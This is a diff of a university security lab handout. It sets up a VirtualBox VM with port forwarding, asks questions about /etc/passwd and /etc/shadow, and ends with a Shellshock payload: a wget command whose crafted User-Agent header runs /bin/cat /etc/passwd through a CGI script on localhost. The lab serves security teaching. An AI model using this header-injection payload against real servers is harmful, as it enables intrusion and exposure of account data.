@@ -8,12 +8,22 @@ This time we are going to look at some of vulnerabilities of Web servers. In bot
 
 For this lab you will run a virtual box virtual machine that you can fully configure as superuser. I have prepared one for you.
 
-XXX how to copy XXX
+Each of the lab machines has a directory =/seng/seng360/=. In it create a directory with your username, and inside a directory called =vm=. For example, for me
+it will be called =/seng/seng360/dmg/vm=.
 
+1. Download the following file: http://turingmachine.org/~dmg/temp/vmLab5.tar.bz2. Uncompress it and place it under the =vm= directory you just created.
+2. Run virtual box with the command =virtualbox=
+3. At this point no virtual box is setup up. Go to /File,Preferences/ and in the /General/ section change the /Default Machine Folder/ to point to the directory
+   you created above (in my case =/seng/seng360/dmg/vm=). Leave everything else the same.
+4. Now add the virtualbox: Using the menu option /Machine, Add/ select the virtualbox inside the =/seng/seng360/<user>/vm/seng360bare= directory.
+5. At this point you main screen should be something like this:
+
+[[file:vmBare.png]]
+  
 
 * Configure the virtual machine
 
-Enable the following ports in your virtual machine (see
+Make sure that the following ports are been forwared in the your virtual machine. See:
 
 http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-externally-through-a-host)
 
@@ -21,6 +31,9 @@ http://stackoverflow.com/questions/5906441/how-to-ssh-to-a-virtualbox-guest-exte
 |------+----------+---------+----------+------------|
 | HTTP | TCP      | 3080    |          | 80         |
 | SSH  | TCP      | 3030    |          | 22         |
+
+
+* Start your virtual machine
 
 Once you run the virtual machine you should be able to SSH to the virtual machine using port 3080 in the localmachine, and the webserver will be running in port 3080
 You can test both with telnet
@@ -104,13 +117,13 @@ Test it.
 
 read the man page of shadow (man shadow). Inspect the files /etc/passwd and /etc/shadow
 
- *Question 6* Why does Linux maintain /etc/shawdow?
+ *Question 6* Why does Linux maintain =/etc/shawdow=?
 
- *Question 7* what is the difference between /etc/passwd and /etc/shadow
+ *Question 7* what is the difference between =/etc/passwd= and =/etc/shadow=
 
 ** The attack
 
-Now we can try the attack. Using wget run:
+Now we can try the attack. Using =wget= run:
 
 #+begin_src bash
 wget -O /tmp/output.txt -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost/cgi-bin/test.bash
